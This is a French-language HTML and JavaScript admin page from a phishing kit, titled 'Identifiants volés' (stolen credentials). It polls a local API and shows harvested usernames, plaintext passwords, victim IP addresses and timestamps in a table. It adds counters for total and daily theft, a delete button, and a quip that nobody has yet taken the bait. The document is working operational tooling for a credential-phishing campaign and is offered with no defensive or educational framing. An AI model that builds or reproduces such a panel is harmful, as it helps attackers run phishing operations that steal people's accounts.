<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - Identifiants volés</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background-color: #000000;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            padding: 40px 20px;
            color: #e7e9ea;
            min-height: 100vh;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
            padding-bottom: 20px;
            border-bottom: 1px solid #2f3336;
            flex-wrap: wrap;
            gap: 16px;
        }
        .header h1 {
            font-size: 28px;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .header h1 span {
            background-color: #f4212e;
            color: #fff;
            font-size: 14px;
            padding: 2px 12px;
            border-radius: 40px;
        }
        .btn-logout {
            background-color: #2f3336;
            color: #e7e9ea;
            border: none;
            padding: 8px 20px;
            border-radius: 40px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }
        .btn-logout:hover { background-color: #3d4144; }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 16px;
            margin-bottom: 32px;
        }
        .stat-card {
            background-color: #121212;
            border: 1px solid #2f3336;
            border-radius: 16px;
            padding: 20px;
            text-align: center;
        }
        .stat-card .number { font-size: 32px; font-weight: 700; }
        .stat-card .label { color: #71767b; font-size: 14px; margin-top: 4px; }
        .table-wrapper {
            background-color: #121212;
            border: 1px solid #2f3336;
            border-radius: 16px;
            overflow: hidden;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        thead { background-color: #1c1c1c; }
        th {
            text-align: left;
            padding: 14px 16px;
            color: #71767b;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-bottom: 1px solid #2f3336;
        }
        td {
            padding: 14px 16px;
            border-bottom: 1px solid #1c1c1c;
        }
        tr:hover td { background-color: #1c1c1c; }
        .badge {
            background-color: rgba(244, 33, 46, 0.15);
            color: #f4212e;
            padding: 2px 10px;
            border-radius: 40px;
            font-size: 12px;
            font-weight: 600;
        }
        .btn-delete {
            background-color: rgba(244, 33, 46, 0.15);
            color: #f4212e;
            border: none;
            padding: 4px 14px;
            border-radius: 40px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
        }
        .btn-delete:hover { background-color: rgba(244, 33, 46, 0.3); }
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #71767b;
        }
        .empty-state .icon { font-size: 48px; margin-bottom: 16px; }
        .empty-state h3 { color: #e7e9ea; font-size: 20px; margin-bottom: 8px; }
        .loading { text-align: center; padding: 60px; color: #71767b; }
        .spinner {
            display: inline-block;
            width: 40px;
            height: 40px;
            border: 3px solid #2f3336;
            border-radius: 50%;
            border-top-color: #1d9bf0;
            animation: spin 0.8s linear infinite;
            margin-bottom: 16px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @media (max-width: 768px) {
            body { padding: 16px; }
            .header h1 { font-size: 22px; }
            .table-wrapper { overflow-x: auto; }
            table { min-width: 600px; }
            th, td { padding: 10px 12px; }
        }
    </style>
</head>
<body>
<div class="container">
    <header class="header">
        <h1>🔴 Identifiants volés <span id="count">0</span></h1>
        <button class="btn-logout" id="logout-btn">🚪 Déconnexion</button>
    </header>

    <div class="stats-grid">
        <div class="stat-card">
            <div class="number" id="stat-total">0</div>
            <div class="label">Total volés</div>
        </div>
        <div class="stat-card">
            <div class="number" id="stat-today">0</div>
            <div class="label">Aujourd'hui</div>
        </div>
    </div>

    <div class="table-wrapper">
        <div id="loading" class="loading">
            <div class="spinner"></div>
            <p>Chargement...</p>
        </div>
        <div id="content" style="display:none;">
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Password</th>
                        <th>IP</th>
                        <th>Date</th>
                        <th style="text-align:center;">Action</th>
                    </tr>
                </thead>
                <tbody id="tbody"></tbody>
            </table>
        </div>
        <div id="empty" class="empty-state" style="display:none;">
            <div class="icon">📭</div>
            <h3>Rien pour l'instant</h3>
            <p>Personne n'a encore mordu à l'hameçon.</p>
        </div>
    </div>
</div>

<script>
    const API_URL = '/api/credentials';
    const tbody = document.getElementById('tbody');
    const loading = document.getElementById('loading');
    const content = document.getElementById('content');
    const empty = document.getElementById('empty');
    const count = document.getElementById('count');
    const statTotal = document.getElementById('stat-total');
    const statToday = document.getElementById('stat-today');

    async function loadCredentials() {
        try {
            loading.style.display = 'block';
            content.style.display = 'none';
            empty.style.display = 'none';

            const response = await fetch(API_URL);
            if (response.status === 401) {
                window.location.href = '/admin';
                return;
            }
            if (!response.ok) throw new Error('Erreur');

            const data = await response.json();
            loading.style.display = 'none';

            if (!data || data.length === 0) {
                empty.style.display = 'block';
                updateStats([]);
                return;
            }

            content.style.display = 'block';
            renderData(data);
            updateStats(data);

        } catch (error) {
            console.error('Erreur:', error);
            loading.style.display = 'none';
            empty.style.display = 'block';
            document.querySelector('#empty h3').textContent = '⚠️ Erreur';
            document.querySelector('#empty p').textContent = 'Impossible de charger les données.';
        }
    }

    function renderData(data) {
        tbody.innerHTML = '';
        data.forEach(row => {
            const tr = document.createElement('tr');
            const date = new Date(row.created_at).toLocaleString('fr-FR', {
                day: '2-digit', month: '2-digit', year: 'numeric',
                hour: '2-digit', minute: '2-digit'
            });
            tr.innerHTML = `
                <td>#${row.id}</td>
                <td><strong>${escapeHtml(row.username)}</strong></td>
                <td><span class="badge">${escapeHtml(row.password)}</span></td>
                <td style="color:#71767b;font-size:13px;">${escapeHtml(row.ip || 'inconnu')}</td>
                <td style="color:#71767b;font-size:13px;">${date}</td>
                <td style="text-align:center;">
                    <button class="btn-delete" data-id="${row.id}">🗑️</button>
                </td>
            `;
            tbody.appendChild(tr);
        });

        document.querySelectorAll('.btn-delete').forEach(btn => {
            btn.addEventListener('click', handleDelete);
        });

        count.textContent = data.length;
    }

    function escapeHtml(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    function updateStats(data) {
        const total = data.length;
        statTotal.textContent = total;

        const now = new Date();
        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        let todayCount = 0;
        data.forEach(row => {
            const d = new Date(row.created_at);
            if (d >= today) todayCount++;
        });
        statToday.textContent = todayCount;
    }

    async function handleDelete(e) {
        const btn = e.currentTarget;
        const id = btn.dataset.id;
        if (!confirm(`Supprimer #${id} ?`)) return;

        try {
            const response = await fetch(`/api/credentials/${id}`, { method: 'DELETE' });
            if (response.ok) loadCredentials();
        } catch (error) {
            alert('Erreur lors de la suppression');
        }
    }

    document.getElementById('logout-btn').addEventListener('click', async () => {
        await fetch('/api/logout', { method: 'POST' });
        window.location.href = '/admin';
    });

    loadCredentials();
    setInterval(loadCredentials, 10000);
</script>
</body>
</html>
